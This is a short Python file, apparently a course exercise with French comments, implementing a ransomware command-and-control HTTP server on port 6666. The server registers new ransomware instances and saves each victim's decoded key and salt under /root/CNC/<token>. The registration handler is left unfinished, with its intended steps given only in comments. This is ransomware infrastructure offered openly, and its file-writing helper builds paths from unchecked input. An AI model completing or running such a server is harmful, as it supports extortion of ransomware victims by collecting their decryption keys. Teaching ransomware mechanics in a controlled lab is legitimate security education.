import base64
from hashlib import sha256
from http.server import HTTPServer
import os
import json

from cncbase import CNCBase

class CNC(CNCBase):
    ROOT_PATH = "/root/CNC"

    def save_b64(self, token:str, data:str, filename:str):
        # helper
        # token and data are base64 field

        bin_data = base64.b64decode(data)
        path = os.path.join(CNC.ROOT_PATH, token, filename)
        with open(path, "wb") as f:
            f.write(bin_data)

    def post_new(self, path:str, params:dict, body:dict)->dict:
        # used to register new ransomware instance
        # Elle doit créer un répertoire à partir du token et y stocker la clef et le sel dans 2 fichiers .bin
        # ici on utilise pas param

        # creer dossier portant le nom du token et créer deux fichiers : key.bin et salt.bin
        self.write(json.dumps(body))
        return {"status":"KO"}

           
httpd = HTTPServer(('0.0.0.0', 6666), CNC)
httpd.serve_forever()